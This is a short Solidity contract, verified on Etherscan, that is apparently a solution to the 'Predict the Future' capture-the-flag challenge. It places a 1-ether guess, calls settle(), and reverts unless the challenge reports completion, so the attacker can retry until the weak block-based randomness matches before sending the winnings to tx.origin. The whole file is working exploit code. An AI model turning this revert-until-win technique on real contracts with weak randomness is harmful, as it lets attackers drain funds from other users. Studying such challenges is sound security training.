/**
 *Submitted for verification at Etherscan.io on 2022-02-01
*/

pragma solidity ^0.8.0;

interface IPredictTheFutureChallenge {
    function isComplete() external view returns (bool);

    function lockInGuess(uint8 n) external payable;

    function settle() external;
}

contract PredictTheFutureAttack {
    IPredictTheFutureChallenge public challenge;

    constructor(address challengeAddress) {
        challenge = IPredictTheFutureChallenge(challengeAddress);
    }

    receive() external payable {}

    function lockInGuess(uint8 n) external payable {
        challenge.lockInGuess{value: 1 ether}(n);
    }

    function attack() external payable {
        challenge.settle();

        require(challenge.isComplete());
        payable(tx.origin).transfer(address(this).balance);
    }
}